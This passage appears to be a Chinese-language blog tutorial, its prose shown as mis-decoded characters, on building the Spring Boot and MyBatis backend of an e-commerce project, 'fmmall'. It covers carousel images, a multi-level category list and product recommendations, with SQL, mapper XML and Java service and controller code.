é¦–é¡µè½®æ’­å›¾</h3><ul><li><p>æ•°æ®åº“æ“ä½œå®ç°</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712104939741.png" alt="image-20220712104939741"></p></li><li><p>ç¼–å†™sqlè¯­å¥</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712105512286.png" alt="image-20220712105512286"></p><pre><code class="hljs mysql">SELECT * FROM index_img WHERE &#96;status&#96; &#x3D; 1 ORDER BY seq</code></pre></li><li><p>åœ¨IndexImgMapperå®šä¹‰æ–¹æ³•</p><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">IndexImgMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">GeneralDao</span>&lt;<span class="hljs-title">IndexImg</span>&gt; </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;IndexImg&gt; <span class="hljs-title">listIndexImgs</span><span class="hljs-params">()</span></span>;&#125;</code></pre></li><li><p>é…ç½®æ˜ å°„æ–‡ä»¶</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;listIndexImgs&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.IndexImg&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>    SELECT * FROM index_img WHERE `status` = 1 ORDER BY seq<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre></li><li><p>ä¸šåŠ¡é€»è¾‘å®ç°</p><p>IndexImgServiceImplæ·»åŠ ä»¥ä¸‹å†…å®¹</p><pre><code class="hljs java"><span class="hljs-meta">@Service</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexImgServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IndexImgService</span> </span>&#123;    <span class="hljs-meta">@Resource</span>    <span class="hljs-keyword">private</span> IndexImgMapper indexImgMapper;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listIndeximgs</span><span class="hljs-params">()</span> </span>&#123;        List&lt;IndexImg&gt; indexImgs = indexImgMapper.listIndexImgs();        <span class="hljs-keyword">if</span>(indexImgs.size() == <span class="hljs-number">0</span>)&#123;            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;failed&quot;</span>, <span class="hljs-keyword">null</span>);        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;success&quot;</span>,indexImgs);    &#125;&#125;</code></pre></li><li><p>æ¥å£å®ç°</p><p>IndexImgController</p><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><span class="hljs-meta">@RequestMapping(&quot;/index&quot;)</span><span class="hljs-meta">@CrossOrigin</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexImgsController</span> </span>&#123;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> IndexImgService indexImgService;    <span class="hljs-meta">@GetMapping(&quot;/indeximg&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">addGoods</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-keyword">return</span> ResultVO.success(indexImgService.listIndeximgs());    &#125;&#125;</code></pre></li></ul><h3 id="1-5-åˆ†ç±»åˆ—è¡¨"><a href="#1-5-åˆ†ç±»åˆ—è¡¨" class="headerlink" title="1.5 åˆ†ç±»åˆ—è¡¨"></a>1.5 åˆ†ç±»åˆ—è¡¨</h3><p>æ¥å£å¼€å‘</p><ul><li><p>æ•°æ®åº“åˆ†æ</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712130956027.png" alt="image-20220712130956027"></p></li><li><p>æ·»åŠ å®ä½“ç±»CategoryVO</p><p>ä¸categoryçš„åŒºåˆ«åœ¨äºå¤šäº†ä¸€ä¸ªå±æ€§ç”¨äºå­˜æ”¾å­æ ‡é¢˜</p><pre><code class="hljs abnf">List&lt;CategoryVO&gt; categoryVOList<span class="hljs-comment">;</span></code></pre></li><li><p>daoå®ç°</p><ul><li><p>æ–¹æ³•ä¸€</p><p>ä½¿ç”¨é€’å½’sqlæŸ¥è¯¢æ•°æ®åº“</p><p>daoä»£ç </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;CategoryVO&gt; <span class="hljs-title">getCategoryList2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> parentId)</span></span>;</code></pre><p>mapperæ˜ å°„æ–‡ä»¶</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.CategoryVO&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!--</span><span class="hljs-comment">      WARNING - @mbg.generated</span><span class="hljs-comment">    --&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryId&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryName&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_level&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryLevel&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;parent_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;parentId&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_icon&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryIcon&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_slogan&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categorySlogan&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_pic&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryPic&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_bg_color&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryBgColor&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">collection</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryVOList&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_id&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.dao.CategoryMapper.getCategoryList2&quot;</span>/&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getCategoryList2&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.CategoryVO&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ResultMap&quot;</span>&gt;</span>      select * from category where parent_id = #&#123;parentId&#125;  <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre></li><li><p>æ–¹æ³•äºŒ</p><p>ç›´æ¥è·å–æ‰€æœ‰åˆ†ç±»çš„æ•°æ®åï¼Œåœ¨javaä»£ç ä¸­è¿›è¡Œçº§åˆ«åˆ†ç±»çš„å¤„ç†ï¼Œå¯ä»¥å¤§å¤§æé«˜å¤„ç†æ•ˆç‡</p></li></ul></li><li><p>serviceä»£ç å®ç°</p><ul><li><p>æ–¹æ³•ä¸€</p><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;CategoryVO&gt; <span class="hljs-title">getCategoryList</span><span class="hljs-params">()</span> </span>&#123;    <span class="hljs-keyword">return</span> categoryMapper.getCategoryList2(<span class="hljs-number">0</span>);&#125;</code></pre></li></ul></li></ul><ul><li><p>æ–¹æ³•äºŒ</p><pre><code class="hljs java">    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;CategoryVO&gt; <span class="hljs-title">getCategoryList</span><span class="hljs-params">()</span> </span>&#123;        List&lt;Category&gt; categories = categoryMapper.getCategoryList();        List&lt;CategoryVO&gt; categoryVOS = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();        <span class="hljs-comment">// è·å–æ‰€æœ‰çš„ä¸€çº§æ ‡é¢˜</span>        <span class="hljs-keyword">for</span> (Category category : categories) &#123;            CategoryVO categoryVO = <span class="hljs-keyword">new</span> CategoryVO();            <span class="hljs-keyword">if</span>(category.getCategoryLevel() == <span class="hljs-number">1</span>)&#123;                BeanUtils.copyProperties(category, categoryVO);                categoryVOS.add(categoryVO);            &#125;        &#125;        <span class="hljs-comment">// å°†ä¸€çº§æ ‡é¢˜ä¸‹çš„äºŒçº§æ ‡é¢˜æ·»åŠ åˆ°setCategoryVOListå±æ€§ä¸­</span>        <span class="hljs-keyword">for</span> (CategoryVO categoryVO : categoryVOS) &#123;            List&lt;CategoryVO&gt; category2List = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();            <span class="hljs-keyword">for</span> (Category category : categories) &#123;                <span class="hljs-comment">// ç­›é€‰æ¡ä»¶ä¸º äºŒçº§æ ‡é¢˜ä¸”çˆ¶æ ‡é¢˜ä¸ä¸€çº§æ ‡é¢˜ä¸€è‡´</span>                <span class="hljs-keyword">if</span>(category.getCategoryLevel() == <span class="hljs-number">2</span> &amp;&amp; category.getParentId().equals(categoryVO.getCategoryId()))&#123;                    CategoryVO categoryvo = <span class="hljs-keyword">new</span> CategoryVO();                    BeanUtils.copyProperties(category, categoryvo);                    category2List.add(categoryvo);                &#125;            &#125;            categoryVO.setCategoryVOList(category2List);<span class="hljs-comment">//            System.out.println(categoryVO);</span>        &#125;        <span class="hljs-keyword">for</span> (CategoryVO categoryVO : categoryVOS) &#123;            <span class="hljs-keyword">for</span>(CategoryVO categoryVO2: categoryVO.getCategoryVOList())&#123;  <span class="hljs-comment">//éå†æ‰€æœ‰äºŒçº§æ ‡é¢˜</span>                List&lt;CategoryVO&gt; category3List = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;(); <span class="hljs-comment">//ä¿å­˜ä¸‰çº§æ ‡é¢˜çš„æ•°ç»„</span>                <span class="hljs-keyword">for</span> (Category category : categories) &#123;                    <span class="hljs-comment">// ç­›é€‰ç¬¦åˆæ¡ä»¶çš„ä¸‰çº§æ ‡é¢˜ å­˜æ”¾åˆ°äºŒçº§æ ‡é¢˜çš„ categoryVOListä¸­</span>                    <span class="hljs-keyword">if</span>(category.getCategoryLevel() == <span class="hljs-number">3</span> &amp;&amp; category.getParentId().equals(categoryVO2.getCategoryId()))&#123;                        CategoryVO categoryvo = <span class="hljs-keyword">new</span> CategoryVO();                        BeanUtils.copyProperties(category, categoryvo);                        category3List.add(categoryvo);                    &#125;                &#125;                categoryVO2.setCategoryVOList(category3List);            &#125;            System.out.println(categoryVO);        &#125;        <span class="hljs-keyword">return</span> categoryVOS;    &#125;</code></pre></li></ul><ul><li><p>controllerå®ç°</p><pre><code class="hljs java">    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> CategoryService categoryService;    <span class="hljs-meta">@GetMapping(&quot;/category-list&quot;)</span>    <span class="hljs-meta">@ApiOperation(value = &quot;è·å–é¦–é¡µåˆ†ç±»æ•°æ®&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getCategoryList</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-keyword">return</span> ResultVO.success(categoryService.getCategoryList1());<span class="hljs-comment">//        return ResultVO.success(categoryService.getCategoryList2());</span>    &#125;</code></pre><p>å®æµ‹æ–¹æ³•äºŒæ¯”æ–¹æ³•ä¸€çš„å“åº”é€Ÿåº¦è¦å¿«å¾ˆå¤šå€ï¼Œæ‰€ä»¥è¿˜æ˜¯å‡å°‘åœ¨æ•°æ®åº“ä¸­è¿›è¡Œæ•°æ®çš„å¤„ç†ã€‚</p><table><thead><tr><th>æ–¹æ³•ä¸€</th><th>æ–¹æ³•äºŒ</th></tr></thead><tbody><tr><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712173631776.png" alt="image-20220712173631776"></td><td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712173546986.png" alt="image-20220712173546986"></td></tr></tbody></table><p>å®ç°æ•ˆæœå¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712174710162.png" alt="image-20220712174710162"></p></li></ul><h3 id="1-6-å•†å“æ¨è"><a href="#1-6-å•†å“æ¨è" class="headerlink" title="1.6 å•†å“æ¨è"></a>1.6 å•†å“æ¨è</h3><blockquote><p>æ¨èå•†å“åŸåˆ™å¯ä»¥æ˜¯ 1.æ ¹æ®å•†åŸé”€é‡æ¨è2.æ¨èå•†åŸæœ€æ–°ä¸Šæ¶çš„å•†å“</p><p>è¯´æ˜ï¼šå•†å“æ¨èç®—æ³•æ˜¯æ ¹æ®å¤šä¸ªç»´åº¦è¿›è¡Œæƒé‡è®¡ç®—çš„ç»“æœï¼Œè®¡ç®—å‡ºä¸€ä¸ªåŒ¹é…å€¼</p></blockquote><ul><li><p>æ•°æ®åº“æ“ä½œ</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712175743195.png" alt="image-20220712175743195"></p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712175819883.png" alt="image-20220712175819883"></p><pre><code class="hljs mysql">select * from product order by create_time desc limit 0,3;</code></pre></li><li><p>æ·»åŠ å®ä½“ç±»ProdoctVO</p><p>ä¸productçš„åŒºåˆ«åœ¨äºå¤šä¸€ä¸ªå±æ€§ç”¨äºå­˜åœ¨ä¸è¯¥äº§å“ç›¸å…³çš„å›¾ç‰‡</p><pre><code class="hljs typescript"><span class="hljs-keyword">private</span> List&lt;ProductImg&gt; imgs;<span class="hljs-keyword">public</span> List&lt;ProductImg&gt; <span class="hljs-function"><span class="hljs-title">getImgs</span>(<span class="hljs-params"></span>)</span> &#123;<span class="hljs-keyword">return</span> imgs;&#125;<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">setImgs</span>(<span class="hljs-params">List&lt;ProductImg&gt; imgs</span>)</span> &#123;<span class="hljs-built_in">this</span>.imgs = imgs;&#125;</code></pre></li><li><p>daoå®ç°</p><ul><li><p>ProductDao</p><pre><code class="hljs java"><span class="hljs-meta">@Mapper</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ProductMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">GeneralDao</span>&lt;<span class="hljs-title">Product</span>&gt; </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Product&gt; <span class="hljs-title">getRecommendProduct</span><span class="hljs-params">()</span></span>;&#125;</code></pre><p>xml</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryId&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;root_category_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;rootCategoryId&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sold_num&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;soldNum&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productStatus&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;create_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createTime&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;update_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;updateTime&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;content&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;LONGVARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;content&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getRecommendProduct&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.Product&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>    select * from product order by create_time desc limit 0,3;<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre></li><li><p>ProductImgDao</p><pre><code class="hljs java"><span class="hljs-meta">@Mapper</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ProductImgMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">GeneralDao</span>&lt;<span class="hljs-title">ProductImg</span>&gt; </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;ProductImg&gt; <span class="hljs-title">getProductImgsById</span><span class="hljs-params">(<span class="hljs-keyword">int</span> productId)</span></span>;&#125;</code></pre><p>xml</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;id&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;item_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;itemId&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;url&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sort&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sort&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;is_main&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;isMain&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;created_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createdTime&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;updated_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;updatedTime&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getProductImgsById&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.ProductImg&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>    select * from product_img where item_id = #&#123;productId&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre></li></ul></li><li><p>serviceä»£ç </p><pre><code class="hljs java"><span class="hljs-meta">@Resource</span><span class="hljs-keyword">private</span> ProductMapper productMapper;<span class="hljs-meta">@Resource</span><span class="hljs-keyword">private</span> ProductImgMapper productImgMapper;<span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;ProductVO&gt; <span class="hljs-title">getRecommendProductList</span><span class="hljs-params">()</span> </span>&#123;    List&lt;Product&gt; recommendProductList = productMapper.getRecommendProduct();    List&lt;ProductVO&gt; productVOS = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();    <span class="hljs-keyword">for</span> (Product product : recommendProductList) &#123;        ProductVO productVO = <span class="hljs-keyword">new</span> ProductVO();        List&lt;ProductImg&gt; imgs = productImgMapper.getProductImgsById(Integer.parseInt(product.getProductId()));        BeanUtils.copyProperties(product, productVO);        productVO.setImgs(imgs);        productVOS.add(productVO);    &#125;    <span class="hljs-keyword">return</span> productVOS;&#125;</code></pre></li><li><p>controllerä»£ç </p><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ProductService productService;<span class="hljs-meta">@GetMapping(&quot;/list-recommends&quot;)</span><span class="hljs-meta">@ApiOperation(value = &quot;è·å–å•†å“æ¨èæ•°æ®&quot;)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getRecommendsList</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">return</span> ResultVO.success(productService.getRecommendProductList());&#125;</code></pre><p>æµ‹è¯•ç»“æœ</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712183632458.png" alt="image-20220712183632458"></p></li></ul><h3 id="1-7-åˆ†ç±»å•†å“æ¨è"><a href="#1-7-åˆ†ç±»å•†å“æ¨è" class="headerlink" title="1.7 åˆ†ç±»å•†å“æ¨è"></a>1.7 åˆ†ç±»å•†å“æ¨è</h3><blockquote><p>ä¸€æ¬¡æ€§åŠ è½½æ‰€æœ‰åˆ†ç±»çš„æ¨èå•†å“ï¼Œæ•´ä½“å®Œæˆåˆå§‹åŒ–</p><p>åˆ†åˆ«è·å–æ‰€æœ‰ä¸€çº§æ ‡é¢˜ä¸‹é”€é‡æœ€é«˜çš„å…­ä¸ªå•†å“</p><p>è¿”å›æŸ¥è¯¢åˆ°çš„6ä¸ªå•†å“</p></blockquote><ul><li><p>sqlè¯­å¥</p><pre><code class="hljs mysql">  from productwhere root_category_id &#x3D; rootId and product_status &#x3D; 1order by sold_num desclimit 0,6;</code></pre><p>è·å–åˆ°rootIdä¸‹é”€é‡å‰å…­çš„å•†å“ä¿¡æ¯</p></li><li><p>dao</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Product&gt; <span class="hljs-title">getRecommendByCategory</span><span class="hljs-params">(<span class="hljs-keyword">int</span> rootId)</span></span>;</code></pre><p>xml</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getRecommendByCategory&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.Product&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>    select *    from product    where root_category_id = #&#123;rootId&#125; and product_status = 1    order by sold_num desc    limit 0,6;<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre></li><li><p>service</p><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;CategoryDTO&gt; <span class="hljs-title">getRecommendByCategory</span><span class="hljs-params">()</span> </span>&#123;    List&lt;Category&gt; categoryList = categoryMapper.getCategoryList(); <span class="hljs-comment">// è·å–æ‰€æœ‰çš„åˆ†ç±»</span>    List&lt;CategoryDTO&gt; categoryDTOList = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;(); <span class="hljs-comment">// ç”¨äºä¿å­˜ç»“æœ</span>    <span class="hljs-keyword">for</span> (Category category : categoryList) &#123;        <span class="hljs-keyword">if</span> (category.getCategoryLevel() == <span class="hljs-number">1</span>) &#123;            CategoryDTO categoryDTO = <span class="hljs-keyword">new</span> CategoryDTO();            List&lt;ProductVO&gt; productVOList = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();            List&lt;Product&gt; productList = productMapper.getRecommendByCategory(category.getCategoryId());            <span class="hljs-comment">// æ ¹æ®root_category_idç­›é€‰å±äºè¯¥ä¸€çº§åˆ†ç±»çš„å•†å“</span>            <span class="hljs-keyword">for</span> (Product product : productList) &#123;                <span class="hljs-comment">//  å°†äº§å“çš„å›¾ç‰‡æŸ¥è¯¢å‡ºæ¥åŠ å…¥åˆ°productVOçš„imgså±æ€§ä¸­</span>                ProductVO productVO = <span class="hljs-keyword">new</span> ProductVO();                List&lt;ProductImg&gt; imgs = productImgMapper.getProductImgsById(Integer.parseInt(product.getProductId()));                BeanUtils.copyProperties(product, productVO);                productVO.setImgs(imgs);                productVOList.add(productVO);            &#125;            <span class="hljs-comment">// å°†å¤„ç†å¾—åˆ°çš„productVOListåŠ å…¥åˆ°CategoryDTOçš„productså±æ€§ä¸­</span>            categoryDTO.setProducts(productVOList);            BeanUtils.copyProperties(category, categoryDTO);            categoryDTOList.add(categoryDTO);        &#125;    &#125;    <span class="hljs-keyword">return</span> categoryDTOList;&#125;</code></pre><p>** è¯¥æ–¹æ³•å®ç°çš„æœ‰ç‚¹å¤æ‚ï¼Œå¹¶ä¸”æ•ˆç‡æ¯”è¾ƒä½ï¼Œå¯ä»¥é‡‡ç”¨è”åˆæŸ¥è¯¢çš„æ–¹æ³•è¿›è¡Œä¼˜åŒ–</p></li><li><p>controller</p><pre><code class="hljs java"><span 